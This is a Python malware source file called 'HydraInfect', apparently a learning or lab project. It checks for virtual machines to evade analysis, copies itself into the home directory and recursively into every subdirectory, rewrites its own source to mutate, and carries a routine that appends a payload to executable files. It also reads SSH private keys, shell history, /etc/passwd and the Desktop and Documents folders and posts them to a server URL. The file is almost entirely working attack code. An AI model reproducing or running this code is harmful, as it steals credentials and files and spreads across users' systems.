import os
import platform
import ctypes
import shutil
import random
import requests
import time
import subprocess
import stat

payload = "#virus"

# Constants for code injection (Windows only)
PROCESS_ALL_ACCESS = 0x1F0FFF
VIRTUAL_MEM = (0x1000 | 0x2000)
PAGE_EXECUTE_READWRITE = 0x40


# 1. Environment Detection (Basic Evasion)
def is_virtual_environment():
    if platform.system() == "Linux":
        # Check for specific virtualization files
        if os.path.exists('/proc/scsi/scsi'):
            with open('/proc/scsi/scsi') as f:
                if 'VMware' in f.read() or 'VirtualBox' in f.read() or 'QEMU' in f.read():
                    return True        
        # Check for DMI entries (BIOS/Hardware info)
        if os.path.exists('/sys/class/dmi/id/product_name'):
            with open('/sys/class/dmi/id/product_name') as f:
                product_name = f.read().strip()
                if 'VirtualBox' in product_name or 'VMware' in product_name or 'QEMU' in product_name:
                    return True
        
        if os.path.exists('/sys/class/dmi/id/sys_vendor'):
            with open('/sys/class/dmi/id/sys_vendor') as f:
                sys_vendor = f.read().strip()
                if 'VirtualBox' in sys_vendor or 'VMware' in sys_vendor or 'QEMU' in sys_vendor:
                    return True
        
        # Check for CPU flags related to virtualization
        try:
            with open('/proc/cpuinfo') as f:
                cpuinfo = f.read()
                if 'hypervisor' in cpuinfo:
                    return True
        except FileNotFoundError:
            pass
        
        # Alternative check using `lshw` if available
        try:
            output = os.popen('lshw -short').read()
            if 'VirtualBox' in output or 'VMware' in output or 'QEMU' in output:
                return True
        except Exception:
            pass

        return False

    #For checking if it is in Windows UTM 
    if platform.system() == "Windows":
        import winreg
        # Check for QEMU specific registry entries
        try:
            with winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, "HARDWARE\\DESCRIPTION\\System") as key:
                value, _ = winreg.QueryValueEx(key, "SystemBiosVersion")
                if "QEMU" in value:
                    return True
        except FileNotFoundError:
            pass

        # Check for QEMU specific strings in system information
        try:
            output = subprocess.check_output("wmic computersystem get model", shell=True).decode()
            if "QEMU" in output:
                return True
        except subprocess.CalledProcessError:
            pass

        # Check for QEMU-related processes (requires administrative privileges)
        try:
            output = subprocess.check_output("tasklist", shell=True).decode()
            qemu_processes = ["qemu-system-x86_64.exe", "qemu-ga.exe"]
            for proc in qemu_processes:
                if proc in output:
                    return True
        except subprocess.CalledProcessError:
            pass

        return False
    
    #For checking if it is in a MacOS UTM
    if platform.system() == "Darwin":  # macOS
        # Check for UTM-specific files and directories
        utm_files = [
            "/Applications/UTM.app",
            "/Library/Application Support/utm"
        ]
        if any(os.path.exists(path) for path in utm_files):
            return True
        
        # Check system profile for specific virtualization-related strings
        try:
            output = subprocess.check_output("system_profiler SPHardwareDataType", shell=True).decode()
            if "Virtual" in output or "QEMU" in output:
                return True
        except subprocess.CalledProcessError:
            pass

        # Check for known UTM kernel extensions
        try:
            output = subprocess.check_output("kextstat", shell=True).decode()
            if "utm" in output or "qemu" in output:
                return True
        except subprocess.CalledProcessError:
            pass
        
        # Check for known UTM processes
        try:
            output = subprocess.check_output("ps aux", shell=True).decode()
            if "UTM" in output or "qemu" in output:
                return True
        except subprocess.CalledProcessError:
            pass

    return False
    

# 2. Display Message
def display_message():
    os_type = platform.system()
    if os_type == "Windows":
        ctypes.windll.user32.MessageBoxW(0, "You've been infected by HydraInfect!", "Malware Alert", 1)
    elif os_type == "Darwin":  # macOS
        try:
            subprocess.run(['osascript', '-e', 'display dialog "You\'ve been infected by HydraInfect!"'])
        except Exception as e:
            print(f"Failed to display message on macOS: {e}")
    elif os_type == "Linux":
        try:
            subprocess.run(['zenity', '--info', '--text=You\'ve been infected by HydraInfect!'])
        except Exception as e:
            print(f"Failed to display message on Linux: {e}")
    else:
        print("You've been infected by HydraInfect!")  # Fallback for other OSes


# 3. Virus-like Behavior (Self-Replication)
def replicate():
    current_file = __file__
    print(f"Current file path: {current_file}")
    
    target_locations = []

    if platform.system() == "Windows":
        target_path = os.path.join(os.environ["HOMEPATH"], "malware_copy.exe")
        print(f"Target path for Windows: {target_path}")
        target_locations.append(target_path)
    elif platform.system() == "Linux" or platform.system() == "Darwin":
        target_path = os.path.expanduser("~/malware_copy")
        print(f"Target path for Linux/macOS: {target_path}")
        target_locations.append(target_path)

    for target in target_locations:
        print(f"Copying to: {target}")
        shutil.copyfile(current_file, target)

def make_executable(file_path):
    # Add execute permissions for the owner
    st = os.stat(file_path)
    os.chmod(file_path, st.st_mode | stat.S_IEXEC)

#Infinite replicating to overload system
def infinite_replicate():
    current_file = __file__
    target_dir = os.path.expanduser("~")  # Start in the user's home directory

    while True:
        for i in range(10):  # Limit the number of copies per loop to prevent rapid system overload
            target_location = os.path.join(target_dir, f"malware_copy_{random.randint(1000, 9999)}.py")
            shutil.copyfile(current_file, target_location)
            print(f"Copied to {target_location}")

        # Recursively replicate to other directories
        for root, dirs, files in os.walk(target_dir):
            for name in dirs:
                new_target_dir = os.path.join(root, name)
                target_location = os.path.join(new_target_dir, f"malware_copy_{random.randint(1000, 9999)}.py")
                shutil.copyfile(current_file, target_location)
                print(f"Copied to {target_location}")

        # Wait a bit before replicating again to avoid immediate detection
        time.sleep(5)


#Spreading and injecting payload for linux:

def is_executable(file_path):
    """Check if the file is executable."""
    return os.path.isfile(file_path) and os.access(file_path, os.X_OK)

def inject_payload(file_path):
    """Inject payload into the file."""
    with open(file_path, 'ab') as f:
        f.write(payload)
    print(f"Injected payload into {file_path}")

def search_and_inject(base_path):
    """Search for executable files and inject payload."""
    for root, dirs, files in os.walk(base_path):
        for file in files:
            file_path = os.path.join(root, file)
            if is_executable(file_path):
                inject_payload(file_path)
                

# 4. Mutation
def mutate():
    with open(__file__, 'r') as f:
        lines = f.readlines()

    mutation_line = random.randint(0, len(lines) - 1)
    lines.insert(mutation_line, f"# Mutation {random.randint(1, 100000)}\n")

    with open(__file__, 'w') as f:
        f.writelines(lines)

# 5. Data Exfiltration

def get_sensitive_data():
    # Define the paths to check for sensitive data
    paths = [
        os.path.expanduser('~/.bash_history'),
        os.path.expanduser('~/.ssh/id_rsa'),
        os.path.expanduser('~/Desktop'),
        os.path.expanduser('~/Documents'),
        '/etc/passwd',  # Example for Unix-like systems
    ]
    
    sensitive_data = ''
    for path in paths:
        if os.path.exists(path):
            try:
                with open(path, 'r') as file:
                    sensitive_data += f'\nContents of {path}:\n'
                    sensitive_data += file.read()
            except Exception as e:
                sensitive_data += f'\nFailed to read {path}: {e}\n'
    
    return sensitive_data

def send_data_to_server(data, server_url):
# Mutation 17409
    try:
        response = requests.post(server_url, data={'data': data})
        if response.status_code == 200:
            print("Data sent successfully")
        else:
            print(f"Failed to send data, status code: {response.status_code}")
            print(response.text)
    except Exception as e:
        print(f"Error sending data: {e}")



# Main function to run the malware
def main():
    print(is_virtual_environment())
    # if is_virtual_environment():
    #     return
    replicate()
    # infinite_replicate()
    mutate()
    # Specify the base directory to start searching
    # base_directory = '/'
    # base_path = os.getcwd()  # Get the current working directory
    # search_and_inject(base_path)

    # search_and_inject(base_directory)
    
    # Collect sensitive data
    sensitive_data = get_sensitive_data()

    # Send sensitive data to the server
    send_data_to_server(sensitive_data, 'http://localhost:8000/receive')

    display_message()


if __name__ == "__main__":
    main()